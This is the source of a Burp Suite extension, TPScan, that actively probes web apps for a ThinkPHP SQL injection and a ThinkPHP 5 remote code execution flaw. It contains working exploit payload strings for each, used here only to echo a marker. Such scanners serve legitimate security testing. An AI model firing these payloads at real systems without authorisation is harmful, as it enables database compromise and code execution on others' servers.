#!/usr/bin/env python
# coding=utf-8
# author: shino
# date: 2019-11-14
import sys

reload(sys)
sys.setdefaultencoding('utf8')

try:
    import pickle
    import random
    import re
    import string
    import time
    import copy
    import base64
    import jarray
    import traceback
    from string import Template
    from cgi import escape

    from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter, IScannerCheck, \
        IScanIssue
    import jarray
except ImportError:
    print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."

VERSION = "1.0.0"
DEBUG = False
callbacks = None
helpers = None


def html_encode(string):
    return string.replace("<", "&lt;").replace(">", "&gt;")


def safe_bytes_to_string(bytes):
    if bytes is None:
        bytes = ''
    return helpers.bytesToString(bytes)


class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, this_callbacks):
        global callbacks, helpers
        callbacks = this_callbacks
        helpers = callbacks.getHelpers()
        callbacks.setExtensionName("TPScan for BurpSuite")
        callbacks.registerScannerCheck(tpscan4burp())

        print "Successfully loaded TPScan for burpsuite v {}\nAuthor: Loneyer\nGithub: https://github.com/Loneyer/tpscan4burp".format(
            VERSION)

        return


class tpscan4burp(IScannerCheck):
    def __init__(self):
        self.scan_checks = [
            self.thinkphp_debug_index_ids_sqli_scan,
            self.thinkphp5_controller_rce,
        ]

    def doPassiveScan(self, basePair):
        return []

    def doActiveScan(self, basePair, insertionPoint):
        if not self.should_trigger_per_request_attacks(basePair, insertionPoint):
            return []

        issues = []
        for scan_check in self.scan_checks:
            try:
                issues.extend(scan_check(basePair))
            except Exception:
                print 'Error executing PerRequestScans.' + scan_check.__name__ + ': '
                print(traceback.format_exc())

        return issues

    def should_trigger_per_request_attacks(self, basePair, insertionPoint):
        request = helpers.analyzeRequest(basePair.getRequest())
        params = request.getParameters()

        # if there are no parameters, scan if there's a HTTP header
        if params:
            # pick the parameter most likely to be the first insertion point
            first_parameter_offset = 999999
            first_parameter = None
            for param_type in (IParameter.PARAM_BODY, IParameter.PARAM_URL, IParameter.PARAM_JSON, IParameter.PARAM_XML,
                               IParameter.PARAM_XML_ATTR, IParameter.PARAM_MULTIPART_ATTR, IParameter.PARAM_COOKIE):
                for param in params:
                    if param.getType() != param_type:
                        continue
                    if param.getNameStart() < first_parameter_offset:
                        first_parameter_offset = param.getNameStart()
                        first_parameter = param
                if first_parameter:
                    break

            if first_parameter and first_parameter.getName() == insertionPoint.getInsertionPointName():
                return True

        elif insertionPoint.getInsertionPointType() == IScannerInsertionPoint.INS_HEADER and insertionPoint.getInsertionPointName() == 'User-Agent':
            return True

        return False

    def thinkphp_debug_index_ids_sqli_scan(self, basePair):

        Payload = "/index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5('tpscan4burp')),0)]=1"
        attack = self.fetchURL(basePair, Payload)
        if "8b33dd891fc1ca4b0e7e6c482da9316" in safe_bytes_to_string(attack.getResponse()):
            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                                    [attack],
                                    'thinkphp_debug_index_ids_sqli',
                                    'ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability',
                                    'Firm', 'High')]

        return []

    def thinkphp5_controller_rce(self, basePair):

        Payload = '/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=8b33dd891fc1ca4b0e7e6c482da9316'
        attack = self.fetchURL(basePair, Payload)
        if "8b33dd891fc1ca4b0e7e6c482da9316" in safe_bytes_to_string(attack.getResponse()):
            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                                    [attack],
                                    'thinkphp5_controller_rce',
                                    'Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability',
                                    'Firm', 'High')]

        return []

    def fetchURL(self, basePair, url):
        path = helpers.analyzeRequest(basePair).getUrl().getPath()
        newReq = safe_bytes_to_string(basePair.getRequest()).replace(path, url, 1)
        return callbacks.makeHttpRequest(basePair.getHttpService(), newReq)


class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, confidence, severity):
        self.HttpService = httpService
        self.Url = url
        self.HttpMessages = httpMessages
        self.Name = name
        self.Detail = detail
        self.Severity = severity
        self.Confidence = confidence
        return

    def getUrl(self):
        return self.Url

    def getIssueName(self):
        return self.Name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self.Severity

    def getConfidence(self):
        return self.Confidence

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self.Detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self.HttpMessages

    def getHttpService(self):
        return self.HttpService
